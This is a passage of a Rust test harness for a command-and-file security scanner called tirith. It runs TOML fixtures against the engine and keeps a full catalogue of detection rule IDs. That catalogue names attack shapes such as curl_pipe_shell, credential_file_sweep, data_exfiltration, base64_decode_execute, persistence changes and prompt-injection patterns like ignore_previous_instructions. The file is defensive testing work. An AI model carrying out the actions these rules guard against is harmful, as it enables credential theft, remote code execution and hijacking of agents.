use serde::Deserialize;
use std::collections::HashSet;
use std::fs;
use std::path::PathBuf;

use tirith_core::engine::{self, AnalysisContext};
use tirith_core::extract::ScanContext;
use tirith_core::tokenize::ShellType;
use tirith_core::verdict::Action;

#[derive(Debug, Deserialize)]
struct FixtureFile {
    fixture: Vec<Fixture>,
}

#[derive(Debug, Deserialize)]
#[allow(dead_code)]
struct Fixture {
    name: String,
    min_milestone: u8,
    input: String,
    context: String,
    #[serde(default = "default_shell")]
    shell: String,
    expected_action: String,
    expected_rules: Vec<String>,
    /// Rule IDs that MUST NOT appear — pins double-fire boundaries the
    /// positive-only `expected_rules` list would silently accept.
    #[serde(default)]
    forbidden_rules: Vec<String>,
    #[serde(default)]
    raw_bytes: Vec<u8>,
    /// File path for file-scan context fixtures.
    #[serde(default)]
    file_path: Option<String>,
}

fn default_shell() -> String {
    "posix".to_string()
}

fn fixtures_dir() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .unwrap()
        .parent()
        .unwrap()
        .join("tests")
        .join("fixtures")
}

fn load_fixtures(filename: &str) -> Vec<Fixture> {
    let path = fixtures_dir().join(filename);
    let content = fs::read_to_string(&path)
        .unwrap_or_else(|e| panic!("Failed to read {}: {}", path.display(), e));
    let file: FixtureFile = toml::from_str(&content)
        .unwrap_or_else(|e| panic!("Failed to parse {}: {}", path.display(), e));
    file.fixture
}

fn run_fixture(fixture: &Fixture) {
    let shell = fixture
        .shell
        .parse::<ShellType>()
        .unwrap_or(ShellType::Posix);

    let scan_context = match fixture.context.as_str() {
        "exec" => ScanContext::Exec,
        "paste" => ScanContext::Paste,
        "file" => ScanContext::FileScan,
        _ => panic!("Unknown context: {}", fixture.context),
    };

    let raw_bytes = if !fixture.raw_bytes.is_empty() {
        Some(fixture.raw_bytes.clone())
    } else if scan_context == ScanContext::Paste || scan_context == ScanContext::FileScan {
        Some(fixture.input.as_bytes().to_vec())
    } else {
        None
    };

    let file_path = fixture.file_path.as_ref().map(std::path::PathBuf::from);

    let ctx = AnalysisContext {
        input: fixture.input.clone(),
        shell,
        scan_context,
        raw_bytes,
        interactive: true,
        cwd: None,
        file_path,
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
    };

    let verdict = engine::analyze(&ctx);

    let expected_action = match fixture.expected_action.as_str() {
        "allow" => Action::Allow,
        "warn" => Action::Warn,
        "block" => Action::Block,
        other => panic!(
            "Unknown expected_action: {} in fixture {}",
            other, fixture.name
        ),
    };

    assert_eq!(
        verdict.action,
        expected_action,
        "Fixture '{}': expected {:?} but got {:?}. Findings: {:?}",
        fixture.name,
        expected_action,
        verdict.action,
        verdict
            .findings
            .iter()
            .map(|f| format!("{}: {}", f.rule_id, f.title))
            .collect::<Vec<_>>()
    );

    // Built once for both positive and negative assertions (a fixture may
    // declare only `forbidden_rules`).
    let found_rules: Vec<String> = verdict
        .findings
        .iter()
        .map(|f| f.rule_id.to_string())
        .collect();

    for expected_rule in &fixture.expected_rules {
        assert!(
            found_rules.contains(expected_rule),
            "Fixture '{}': expected rule '{}' not found. Found rules: {:?}",
            fixture.name,
            expected_rule,
            found_rules
        );
    }

    for forbidden in &fixture.forbidden_rules {
        assert!(
            !found_rules.contains(forbidden),
            "Fixture '{}': forbidden rule '{}' was found in verdict. Findings: {:?}",
            fixture.name,
            forbidden,
            found_rules
        );
    }
}

#[test]
fn test_hostname_fixtures() {
    let fixtures = load_fixtures("hostname.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} hostname fixtures");
}

#[test]
fn test_path_fixtures() {
    let fixtures = load_fixtures("path.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} path fixtures");
}

#[test]
fn test_transport_fixtures() {
    let fixtures = load_fixtures("transport.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} transport fixtures");
}

#[test]
fn test_terminal_fixtures() {
    let fixtures = load_fixtures("terminal.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} terminal fixtures");
}

#[test]
fn test_command_fixtures() {
    let fixtures = load_fixtures("command.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} command fixtures");
}

#[test]
fn test_ecosystem_fixtures() {
    let fixtures = load_fixtures("ecosystem.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} ecosystem fixtures");
}

#[test]
fn test_environment_fixtures() {
    let fixtures = load_fixtures("environment.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} environment fixtures");
}

#[test]
fn test_clean_fixtures() {
    let fixtures = load_fixtures("clean.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} clean fixtures");
}

#[test]
fn test_shell_weirdness_fixtures() {
    let fixtures = load_fixtures("shell_weirdness.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} shell weirdness fixtures");
}

#[test]
fn test_configfile_fixtures() {
    let fixtures = load_fixtures("configfile.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} configfile fixtures");
}

#[test]
fn test_policy_fixtures() {
    let fixtures = load_fixtures("policy.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} policy fixtures");
}

/// Documented-behavior regression guard: every `documented_commands.toml`
/// fixture encodes a contract promised in the README/TIRITH.md.
#[test]
fn test_documented_commands_fixtures() {
    let fixtures = load_fixtures("documented_commands.toml");
    let count = fixtures.len();
    assert!(
        count > 0,
        "documented_commands.toml is the project's doc-contract guard — must never be empty"
    );
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} documented-command fixtures");
}

#[test]
fn test_rendered_fixtures() {
    let fixtures = load_fixtures("rendered.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} rendered fixtures");
}

#[test]
fn test_credential_fixtures() {
    let fixtures = load_fixtures("credential.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} credential fixtures");
}

#[test]
fn test_codefile_fixtures() {
    let fixtures = load_fixtures("codefile.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} codefile fixtures");
}

#[test]
fn test_cifile_fixtures() {
    let fixtures = load_fixtures("cifile.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} cifile fixtures");
}

#[test]
fn test_aifile_fixtures() {
    let fixtures = load_fixtures("aifile.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} aifile fixtures");
}

#[test]
fn test_threatintel_fixtures() {
    // Point the threat DB cache at the test fixture DB so DB-dependent rules can fire.
    let test_db_path = fixtures_dir().join("test-threatdb.dat");
    assert!(
        test_db_path.exists(),
        "Test threat DB not found at {}. Run: cargo test -p tirith-core --test generate_test_fixtures -- --ignored",
        test_db_path.display()
    );
    std::env::set_var("TIRITH_THREATDB_PATH", &test_db_path);
    tirith_core::threatdb::ThreatDb::refresh_cache();

    let fixtures = load_fixtures("threatintel.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} threatintel fixtures");

    std::env::remove_var("TIRITH_THREATDB_PATH");
    tirith_core::threatdb::ThreatDb::refresh_cache();
}

#[test]
fn test_fixture_count() {
    let files = [
        "hostname.toml",
        "path.toml",
        "transport.toml",
        "terminal.toml",
        "command.toml",
        "ecosystem.toml",
        "environment.toml",
        "clean.toml",
        "shell_weirdness.toml",
        "policy.toml",
        "configfile.toml",
        "rendered.toml",
        "credential.toml",
        "codefile.toml",
        "threatintel.toml",
    ];

    let total: usize = files.iter().map(|f| load_fixtures(f).len()).sum();
    eprintln!("Total golden fixtures: {total}");
    assert!(
        total >= 200,
        "Expected at least 200 golden fixtures, found {total}"
    );
}

/// Verify Tier 1 regex catches all rule-triggering fixtures.
#[test]
fn test_tier1_coverage() {
    let files = [
        "hostname.toml",
        "path.toml",
        "transport.toml",
        "terminal.toml",
        "command.toml",
        "ecosystem.toml",
        "credential.toml",
    ];

    let mut missed = Vec::new();

    for filename in &files {
        let fixtures = load_fixtures(filename);
        for fixture in &fixtures {
            if fixture.expected_action == "allow" && fixture.expected_rules.is_empty() {
                continue;
            }
            let scan_context = match fixture.context.as_str() {
                "exec" => ScanContext::Exec,
                "paste" => ScanContext::Paste,
                _ => continue,
            };

            // Paste: byte scan catches bidi/zero-width/etc., bypassing the tier-1 regex.
            if scan_context == ScanContext::Paste {
                let bytes = if !fixture.raw_bytes.is_empty() {
                    &fixture.raw_bytes
                } else {
                    fixture.input.as_bytes()
                };
                let byte_scan = tirith_core::extract::scan_bytes(bytes);
                let byte_triggered = byte_scan.has_ansi_escapes
                    || byte_scan.has_control_chars
                    || byte_scan.has_bidi_controls
                    || byte_scan.has_zero_width
                    || byte_scan.has_invalid_utf8
                    || byte_scan.has_unicode_tags
                    || byte_scan.has_variation_selectors
                    || byte_scan.has_invisible_math_operators
                    || byte_scan.has_invisible_whitespace
                    || byte_scan.has_hangul_fillers
                    || byte_scan.has_confusable_text;

                if byte_triggered {
                    continue;
                }
            }

            // Exec: byte scan bypasses tier-1 via the exec_bidi_triggered path in engine.rs.
            if scan_context == ScanContext::Exec {
                let byte_scan = tirith_core::extract::scan_bytes(fixture.input.as_bytes());
                if byte_scan.has_bidi_controls
                    || byte_scan.has_zero_width
                    || byte_scan.has_unicode_tags
                    || byte_scan.has_variation_selectors
                    || byte_scan.has_invisible_math_operators
                    || byte_scan.has_invisible_whitespace
                    || byte_scan.has_hangul_fillers
                    || byte_scan.has_confusable_text
                {
                    continue;
                }
            }

            let regex_triggered = tirith_core::extract::tier1_scan(&fixture.input, scan_context);

            if !regex_triggered {
                missed.push(format!(
                    "{}:{} (expected {})",
                    filename, fixture.name, fixture.expected_action
                ));
            }
        }
    }

    if !missed.is_empty() {
        panic!(
            "Tier 1 regex missed {} fixtures (security bug!):\n  {}",
            missed.len(),
            missed.join("\n  ")
        );
    }
}

const ALL_FIXTURE_FILES: &[&str] = &[
    "hostname.toml",
    "path.toml",
    "transport.toml",
    "terminal.toml",
    "command.toml",
    "ecosystem.toml",
    "environment.toml",
    "clean.toml",
    "shell_weirdness.toml",
    "policy.toml",
    "configfile.toml",
    "rendered.toml",
    "credential.toml",
    "codefile.toml",
    "cifile.toml",
    "aifile.toml",
    "threatintel.toml",
    "injection_evasion.toml",
];

/// Output-direction fixtures — NOT in `ALL_FIXTURE_FILES` (those drive
/// `engine::analyze`; output fixtures need `engine::analyze_output`).
const OUTPUT_FIXTURE_FILES: &[&str] = &["output.toml"];

/// Every RuleId variant (snake_case). Add new variants here; the test fails otherwise.
const ALL_RULE_IDS: &[&str] = &[
    // Hostname
    "non_ascii_hostname",
    "punycode_domain",
    "mixed_script_in_label",
    "userinfo_trick",
    "confusable_domain",
    "raw_ip_url",
    "non_standard_port",
    "invalid_host_chars",
    "trailing_dot_whitespace",
    "lookalike_tld",
    // Path
    "non_ascii_path",
    "homoglyph_in_path",
    "double_encoding",
    // Transport
    "plain_http_to_sink",
    "schemeless_to_sink",
    "insecure_tls_flags",
    "shortened_url",
    // Terminal deception
    "ansi_escapes",
    "control_chars",
    "bidi_controls",
    "zero_width_chars",
    "hidden_multiline",
    "unicode_tags",
    "invisible_math_operator",
    "variation_selector",
    "invisible_whitespace",
    "hangul_filler",
    "confusable_text",
    // Command shape
    "pipe_to_interpreter",
    "curl_pipe_shell",
    "wget_pipe_shell",
    "httpie_pipe_shell",
    "xh_pipe_shell",
    "dotfile_overwrite",
    "archive_extract",
    "proc_mem_access",
    "docker_remote_priv_esc",
    "credential_file_sweep",
    "base64_decode_execute",
    "data_exfiltration",
    "wrapper_chain_too_deep",
    "ps_set_execution_policy_bypass",
    "ps_defender_exclusion",
    "ps_inline_download_execute",
    // Code file scan
    "dynamic_code_execution",
    "obfuscated_payload",
    "suspicious_code_exfiltration",
    // Environment
    "proxy_env_set",
    "sensitive_env_export",
    "code_injection_env",
    "interpreter_hijack_env",
    "shell_injection_env",
    // Network destination
    "metadata_endpoint",
    "private_network_access",
    "command_network_deny",
    // Config file
    "config_injection",
    "config_suspicious_indicator",
    "config_malformed",
    "config_non_ascii",
    "config_invisible_unicode",
    "mcp_insecure_server",
    "mcp_untrusted_server",
    "mcp_duplicate_server_name",
    "mcp_overly_permissive",
    "mcp_suspicious_args",
    "mcp_server_drift",
    // Ecosystem
    "git_typosquat",
    "docker_untrusted_registry",
    "pip_url_install",
    "npm_url_install",
    "web3_rpc_endpoint",
    "web3_address_in_url",
    "vet_not_configured",
    // Install-command rules
    "repo_add_from_pipe",
    "unsigned_repo_trust",
    "gpg_check_disabled",
    "kubectl_apply_remote",
    "helm_untrusted_repo",
    "terraform_remote_module",
    "brew_untrusted_tap",
    // CI / repo supply-chain scan rules
    "workflow_unpinned_action",
    "workflow_dangerous_trigger",
    "workflow_curl_pipe_shell",
    "workflow_untrusted_input",
    "dockerfile_unpinned_image",
    "package_script_dangerous",
    // AI-relevant file hidden-content scan rules
    "notebook_hidden_content",
    "notebook_suspicious_output",
    "agent_instruction_hidden",
    "svg_script_embedded",
    "svg_external_reference",
    // Threat intelligence — local DB
    "threat_malicious_package",
    "threat_malicious_ip",
    "threat_package_typosquat",
    "threat_package_similar_name",
    "threat_unresolved_malicious_package",
    // Threat intelligence — supplemental feeds
    "threat_malicious_url",
    "threat_phishing_url",
    "threat_tor_exit_node",
    "threat_threat_fox_ioc",
    // Threat intelligence — real-time lookups
    "threat_osv_vulnerable",
    "threat_cisa_kev",
    "threat_suspicious_package",
    "threat_safe_browsing",
    // Package reputation rules (M6 ch6)
    "package_not_found_in_registry",
    "package_maintainer_change_recent",
    "package_ownership_transferred",
    "package_osv_advisory_active",
    "package_dependency_confusion",
    "package_install_script_network_call",
    "package_repo_mismatch",
    // Package-policy gated rules (M6 ch7)
    "package_policy_newer_than_days",
    "package_policy_low_downloads",
    "package_policy_typosquat_distance",
    "package_policy_unknown_package_with_install_scripts",
    "package_policy_not_found",
    // Rendered content
    "hidden_css_content",
    "hidden_color_content",
    "hidden_html_attribute",
    "markdown_comment",
    "html_comment",
    // Credential
    "credential_in_text",
    "high_entropy_secret",
    "private_key_exposed",
    // Cloaking
    "server_cloaking",
    // Clipboard
    "clipboard_hidden",
    // PDF
    "pdf_hidden_text",
    // Policy
    "policy_blocklisted",
    "agent_denied_by_policy",
    // Custom rules
    "custom_rule_match",
    // License/infrastructure
    "license_required",
    // Output-direction rules (M7 ch1)
    "output_osc52_clipboard_write",
    "output_hidden_text",
    "output_fake_prompt",
    "output_terminal_hyperlink_mismatch",
    "output_title_manipulation",
    "output_clear_screen",
    "output_truncated_escape_sequence",
    // Prompt-injection rules (M7 ch5)
    "prompt_injection_in_output",
    "ignore_previous_instructions",
    "prompt_injection_obfuscated",
    // Output-side data-exfiltration rule (C7)
    "output_data_exfiltration",
    // Operational-context rules (M8 ch1)
    "context_prod_destructive_command",
    "context_prod_write_operation",
    "context_prod_credential_change",
    // SSH operational-context rules (M8 ch2)
    "ssh_remote_destructive_on_labeled_host",
    "ssh_remote_shell_on_labeled_host",
    // IaC operational-context rules (M8 ch3)
    "iac_apply_without_plan",
    "iac_apply_auto_approve",
    "iac_apply_auto_approve_prod",
    "iac_destroy_prod",
    "iac_plan_high_risk_changes",
    "iac_plan_hash_mismatch",
    // Sudo-escalation rules (M8 ch4)
    "sudo_shell_spawn",
    "sudo_env_preserve_sensitive",
    "sudo_tee_system_file",
    "sudo_download_install",
    "sudo_recursive_perms_broad_path",
    // Container-runtime rules (M8 ch5)
    "docker_run_privileged",
    "docker_run_sensitive_bind_mount",
    "docker_exec_prod_container",
    // Workstation hygiene rules (M9 ch1)
    "hygiene_private_key_loose_perms",
    "hygiene_env_world_readable",
    "hygiene_kubeconfig_group_readable",
    "hygiene_npmrc_plaintext_token",
    "hygiene_pypirc_plaintext_token",
    "hygiene_ssh_config_unsafe_include",
    "hygiene_git_credential_helper_store",
    "hygiene_shell_history_secret_like",
    "hygiene_cloud_creds_bad_perms",
    "hygiene_db_dump_in_repo",
    // Persistence-mechanism state-change rules (M9 ch2)
    "persistence_shell_rc_modified",
    "persistence_authorized_keys_new_entry",
    "persistence_crontab_modified",
    "persistence_launch_agent_added",
    "persistence_ssh_config_include",
    "persistence_direnv_new_envrc",
    // Shell-alias / function risk rules (M9 ch3)
    "alias_overrides_critical_command",
    "alias_contains_network_call",
    "alias_contains_credential_read",
    "alias_recently_added",
    // Environment-variable lifecycle rules (M9 ch4)
    "env_sensitive_exposed_to_unknown_script",
    "env_sensitive_persisted_in_shell_rc",
    "env_printenv_to_network_sink",
    // Executable-provenance + PATH-shadowing rules (M9 ch5)
    "exec_in_tmp",
    "exec_recently_modified",
    "exec_world_writable",
    "exec_shadows_system_command",
    "exec_unsigned",
    "exec_in_repo_bin",
    "path_writable_dir_before_system",
    "path_duplicate_command_name",
    "path_dir_in_repo",
    "path_dir_in_tmp",
    // Repo-hook / automation guard rules (M9 ch6)
    "repo_hook_network_call",
    "repo_hook_credential_read",
    "repo_hook_sudo",
    "repo_hook_suspicious_shell_pattern",
    "repo_hook_external_fetch",
    // Blast-radius rules (M10 ch1)
    "blast_deletes_outside_repo",
    "blast_writes_system_path",
    "blast_symlink_traversal",
    "blast_empty_var_glob",
    "blast_find_delete",
    "blast_rsync_delete",
    "blast_large_file_count",
    // Post-run diff rule (M10 ch2)
    "post_run_shell_rc_modified",
    // Tainted-content tracking rules (M10 ch3)
    "exec_of_tainted_file",
    "command_sourced_from_tainted_file",
    // Anomaly-detection rules (M10 ch5, D2)
    "anomaly_first_time_in_this_repo",
    "anomaly_rare_in_baseline",
    // Command-card attestation rules (M11 ch1)
    "command_card_verified",
    "command_card_unverified",
    "command_card_mismatch",
    // Repo command-manifest rules (M11 ch2)
    "repo_command_unknown",
    "repo_command_dangerous_pattern",
    // Honeytoken / canary rule (M11 ch3, D3)
    "canary_token_touched",
    // Paste-provenance rule (M12 ch1)
    "paste_source_mismatch",
    // AI-config drift rules (M13 ch5)
    "ai_config_hidden_instruction_added",
    "ai_config_tool_use_escalation",
    // Cross-event correlation rules (W7)
    "secret_write_then_network",
    "dependency_change_then_network",
    "delete_then_force_push",
    "mass_file_deletion",
    // A2 — scan-coverage incompleteness (assembled by the scan driver)
    "analysis_incomplete",
];

/// Collect all expected_rules from all fixture files into a set.
fn collect_fixture_rules() -> HashSet<String> {
    let mut covered = HashSet::new();
    for file in ALL_FIXTURE_FILES {
        for fixture in load_fixtures(file) {
            for rule in &fixture.expected_rules {
                covered.insert(rule.clone());
            }
        }
    }
    covered
}

/// Collect all fixtures from all files.
fn load_all_fixtures() -> Vec<(String, Fixture)> {
    let mut all = Vec::new();
    for file in ALL_FIXTURE_FILES {
        for fixture in load_fixtures(file) {
            all.push((file.to_string(), fixture));
        }
    }
    all
}

/// Rules that depend on runtime state and cannot be tested via static fixtures
/// (each is covered by dedicated unit/integration tests in its own module).
const EXTERNALLY_TRIGGERED_RULES: &[&str] = &[
    "proxy_env_set",
    "policy_blocklisted",
    "agent_denied_by_policy",
    "command_network_deny",
    "license_required",
    "custom_rule_match",  // requires custom_rules in policy (Team-only)
    "server_cloaking",    // requires network fetch (Unix-only)
    "clipboard_hidden",   // requires --html clipboard input
    "pdf_hidden_text",    // requires .pdf file input
    "config_malformed",   // requires MCP config filename context in file scan
    "vet_not_configured", // requires cargo install without cargo-vet
    // Local-DB threat rules are covered via test-threatdb.dat; the rules below
    // still depend on optional feeds or live APIs.
    "threat_malicious_url",      // requires supplemental URLhaus data
    "threat_phishing_url",       // requires supplemental phishing feeds
    "threat_tor_exit_node",      // requires supplemental Tor exit-node data
    "threat_threat_fox_ioc",     // requires supplemental ThreatFox data
    "threat_osv_vulnerable",     // requires live OSV.dev lookups
    "threat_cisa_kev",           // requires live CISA KEV correlation
    "threat_suspicious_package", // requires live package-health lookups
    "threat_safe_browsing",      // requires a Google Safe Browsing API key
    // M6 ch6 — package reputation rules from package_risk / install_txn /
    // ecosystem_scan, not the engine; need an `--online` registry-API run.
    "package_not_found_in_registry",
    "package_maintainer_change_recent",
    "package_ownership_transferred",
    "package_osv_advisory_active",
    "package_dependency_confusion",
    "package_install_script_network_call",
    "package_repo_mismatch",
    // M6 ch7 — policy-gated rules from install_txn / ecosystem_scan; need an
    // `--online` signal AND a policy crossing the threshold (can't drive both statically).
    "package_policy_newer_than_days",
    "package_policy_low_downloads",
    "package_policy_typosquat_distance",
    "package_policy_unknown_package_with_install_scripts",
    "package_policy_not_found",
    // M7 ch1 — output-direction rules fire from `engine::analyze_output`, not
    // `engine::analyze`; covered by `output.toml` (`test_output_fixtures`).
    "output_osc52_clipboard_write",
    "output_hidden_text",
    "output_fake_prompt",
    "output_terminal_hyperlink_mismatch",
    "output_title_manipulation",
    "output_clear_screen",
    // M7 fix: emitted at end-of-stream when an OSC/CSI sequence is still open;
    // trigger is EOF state, not byte content (covered in output_scan_tests / engine.rs).
    "output_truncated_escape_sequence",
    // M7 ch5 — prompt-injection rules fire from `analyze_output` (covered by
    // `output.toml`) and from `analyze` for Paste/FileScan (covered by CLI smoke tests).
    "prompt_injection_in_output",
    "ignore_previous_instructions",
    // The obfuscated variant fires only after a deobfuscation pass; the
    // guaranteed-reachable case is an OUTPUT-context base64 seed (output bypasses
    // tier-1). Covered by `output.toml` + `test_output_rule_ids_have_fixture_coverage`.
    "prompt_injection_obfuscated",
    // C7 — the output-side data-exfiltration rule fires from `analyze_output`
    // (and Paste), not from the `ALL_FIXTURE_FILES` engine::analyze path. Covered
    // by `output.toml` + `test_output_rule_ids_have_fixture_coverage` and the
    // `rules::exfil` unit tests.
    "output_data_exfiltration",
    // M8 ch1 — operational-context rules need both an active provider context
    // (`context_detect`) AND a labels file; covered by unit + integration tests below.
    "context_prod_destructive_command",
    "context_prod_write_operation",
    "context_prod_credential_change",
    // M8 ch2 — SSH context rules need an SSH host-labels file (unseeded by the
    // static runner); covered by unit tests + integration tests below.
    "ssh_remote_destructive_on_labeled_host",
    "ssh_remote_shell_on_labeled_host",
    // M8 ch3 — IaC rules: the High prod / hash-mismatch / apply-without-plan
    // paths need context detection OR `iac_require_plan_before_apply: true`
    // (unseeded statically); covered by unit + `iac_rule_*` integration tests.
    // `iac_plan_high_risk_changes` comes from `tirith iac check-plan`, not the engine.
    "iac_apply_without_plan",
    "iac_apply_auto_approve_prod",
    "iac_destroy_prod",
    "iac_plan_high_risk_changes",
    "iac_plan_hash_mismatch",
    // M8 ch5 — `docker_exec_prod_container` needs a `container:<name>` label
    // entry (unseeded statically); covered by unit tests in `rules/container.rs`.
    "docker_exec_prod_container",
    // M9 ch1 — hygiene rules fire only from the `tirith hygiene scan|fix` FS
    // walk; they need real files with real mode bits, not an input string.
    // Covered by unit tests in `hygiene.rs` against `tempfile::tempdir()`.
    "hygiene_private_key_loose_perms",
    "hygiene_env_world_readable",
    "hygiene_kubeconfig_group_readable",
    "hygiene_npmrc_plaintext_token",
    "hygiene_pypirc_plaintext_token",
    "hygiene_ssh_config_unsafe_include",
    "hygiene_git_credential_helper_store",
    "hygiene_shell_history_secret_like",
    "hygiene_cloud_creds_bad_perms",
    "hygiene_db_dump_in_repo",
    // M9 ch2 — persistence state-change rules fire only from `tirith persistence
    // diff|watch`; they need a real before/after FS state. Covered by unit tests
    // in `persistence.rs` against `tempfile::tempdir()`.
    "persistence_shell_rc_modified",
    "persistence_authorized_keys_new_entry",
    "persistence_crontab_modified",
    "persistence_launch_agent_added",
    "persistence_ssh_config_include",
    "persistence_direnv_new_envrc",
    // M9 ch3 — alias/function rules fire only from the `tirith aliases
    // scan|explain` parser over rc-file bodies (not exec/paste input). Covered
    // by unit tests in `aliases.rs` against `tempfile::tempdir()`.
    "alias_overrides_critical_command",
    "alias_contains_network_call",
    "alias_contains_credential_read",
    "alias_recently_added",
    // M9 ch4 — env-lifecycle rules: two fire on the exec hot path only when
    // `policy.env_guard_enabled` (opt-in) and read `std::env`; the third fires
    // only from `tirith env guard`. Covered by unit tests in `env_guard.rs`.
    "env_sensitive_exposed_to_unknown_script",
    "env_sensitive_persisted_in_shell_rc",
    "env_printenv_to_network_sink",
    // M9 ch5 — exec-provenance + PATH-shadowing rules: the 3 cheap hot-path
    // rules fire only when `policy.exec_guard_enabled` (opt-in) and need a real
    // on-disk leader / writable `$PATH` dir; the 7 expensive ones fire only from
    // `tirith exec check|provenance` / `tirith path audit|which`. Covered by unit
    // tests in `exec_provenance.rs` / `path_audit.rs` (string-`$PATH`, no env mutation).
    "exec_in_tmp",
    "exec_recently_modified",
    "exec_world_writable",
    "exec_shadows_system_command",
    "exec_unsigned",
    "exec_in_repo_bin",
    "path_writable_dir_before_system",
    "path_duplicate_command_name",
    "path_dir_in_repo",
    "path_dir_in_tmp",
    // M9 ch6 — repo-hook rules fire from `tirith hooks scan|guard|explain` over
    // hook bodies; the 3 High ones can also reach the exec hot path only when
    // `policy.hooks_guard_enabled` (opt-in) + on-disk repo hooks exist. Covered
    // by unit tests in `repo_hooks.rs` against `tempfile::tempdir()`.
    "repo_hook_network_call",
    "repo_hook_credential_read",
    "repo_hook_sudo",
    "repo_hook_suspicious_shell_pattern",
    "repo_hook_external_fetch",
    // M10 ch1 — blast-radius simulator-only rules fire only from `tirith preview`
    // (walks the FS, expands globs); they need a real on-disk tree. Covered by
    // unit tests in `blast_radius.rs`. The 4 cheap string-shape rules have
    // static `command.toml` fixtures.
    "blast_deletes_outside_repo",
    "blast_symlink_traversal",
    "blast_large_file_count",
    // M10 ch2 — post-run shell-rc-modified fires only from `tirith watch`'s
    // post-run diff; needs a real before/after rc state. Covered by a unit test
    // in `cli/checkpoint.rs`.
    "post_run_shell_rc_modified",
    // M10 ch3 — taint-tracking rules fire on the exec path only when the leader
    // (or a sourced/interpreter file arg) is in the taint store at
    // `state_dir()/taint.jsonl`. Covered by unit tests in `taint.rs` + `engine.rs`
    // hot-path tests pointed at a temp store.
    "exec_of_tainted_file",
    "command_sourced_from_tainted_file",
    // M10 ch5 — anomaly rules fire only when `policy.baseline_enabled` (opt-in)
    // AND another rule already fired, via the baseline store at
    // `state_dir()/baseline.jsonl`. Covered by unit tests in `baseline.rs`.
    "anomaly_first_time_in_this_repo",
    "anomaly_rare_in_baseline",
    // M11 ch1 — command-card rules need a signed card on disk + a trusted
    // ed25519 pubkey; covered by unit tests in `command_card.rs` and the
    // `command_card_*` CLI integration tests.
    "command_card_verified",
    "command_card_unverified",
    "command_card_mismatch",
    // M11 ch2 — repo-command-manifest rules fire only when a
    // `.tirith/commands.yaml` exists for the discovered repo (the static runner
    // uses `cwd: None`). Covered by unit tests in `commands_manifest.rs` plus the
    // `engine::tests::manifest_*` tests (incl. the "manifest cannot weaken a High
    // finding" regression).
    "repo_command_unknown",
    "repo_command_dangerous_pattern",
    // M11 ch3 — the canary rule fires (paste/exec/output) only when a token in
    // the store at `state_dir()/canaries.jsonl` appears in the text. Covered by
    // unit tests in `canary.rs` + `engine::tests::canary_*` against a temp store.
    "canary_token_touched",
    // M12 ch1 — paste-provenance fires (Paste) only when a companion record at
    // `state_dir()/clipboard_source.json` matches the paste's SHA-256 AND a URL
    // host differs from the recorded source host. Covered by unit tests in
    // `rules/paste_provenance.rs` plus a CLI integration test.
    "paste_source_mismatch",
    // M13 ch5 — AI-config drift rules fire only from `tirith ai diff` (a
    // snapshot-vs-current diff against `state_dir()/ai_config_snapshot.json`),
    // not PATTERN_TABLE. Covered by unit tests in `rules/aifile.rs` + CLI tests.
    "ai_config_hidden_instruction_added",
    "ai_config_tool_use_escalation",
    // W7: cross-event correlation rules fire only from `correlate_session` over a
    // bounded per-session typed-event ring (`crate::event_buffer`), which
    // `post_process_verdict` consumes after each finalized verdict, never from
    // the `analyze` hot path. They match "A THEN B within a window" sequences, so
    // no single fixture input can trigger them. Covered by unit tests in
    // `event_buffer.rs` and the two-command integration test
    // `correlation_secret_write_then_network_reaches_verdict` in escalation.rs.
    "secret_write_then_network",
    "dependency_change_then_network",
    "delete_then_force_push",
    "mass_file_deletion",
    // A2 — `analysis_incomplete` is assembled by the scan driver from recorded
    // coverage gaps (an oversized/unreadable/unsupported/hash-budget file or a
    // rule panic), never from a fixture input, so it has no PATTERN_TABLE entry
    // and gets no `tests/fixtures` entry. Covered by unit tests in `scan.rs` +
    // the `scan --ci` / `policy` CLI integration tests.
    "analysis_incomplete",
];

/// Collect expected_rules across the output-direction fixture files.
fn collect_output_fixture_rules() -> HashSet<String> {
    let mut covered = HashSet::new();
    for file in OUTPUT_FIXTURE_FILES {
        for fixture in load_fixtures(file) {
            for rule in &fixture.expected_rules {
                covered.insert(rule.clone());
            }
        }
    }
    covered
}

/// Drive the output-direction pipeline (`engine::analyze_output`) against its
/// dedicated fixtures — the analogue of [`test_hostname_fixtures`] etc.
#[test]
fn test_output_fixtures() {
    use tirith_core::engine::{analyze_output, OutputContext};

    for file in OUTPUT_FIXTURE_FILES {
        let fixtures = load_fixtures(file);
        let count = fixtures.len();
        for fixture in &fixtures {
